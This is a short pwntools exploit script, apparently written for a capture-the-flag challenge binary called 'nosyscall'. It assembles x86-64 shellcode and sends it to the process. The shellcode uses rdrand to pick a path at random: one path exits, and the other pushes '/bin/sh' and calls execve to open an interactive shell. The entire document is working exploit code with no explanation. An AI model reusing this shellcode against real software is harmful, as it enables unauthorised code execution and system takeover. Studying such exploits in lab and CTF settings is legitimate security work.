#!/usr/bin/python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
sh = process('./nosyscall')

sc = asm('''
    rdrand rax
    and rax, 1
    cmp rax, 1
    je GIVESHELL
    mov rdi, 0
    mov rax, 60
    syscall
GIVESHELL:
    lea rsp, [rdx + 0x300]
    mov rbx, 0x0068732f6e69622f
    push rbx
    mov rdi, rsp
    xor rdx, rdx
    mov rax, 59
    syscall
''')

sh.send(sc)

sh.interactive()


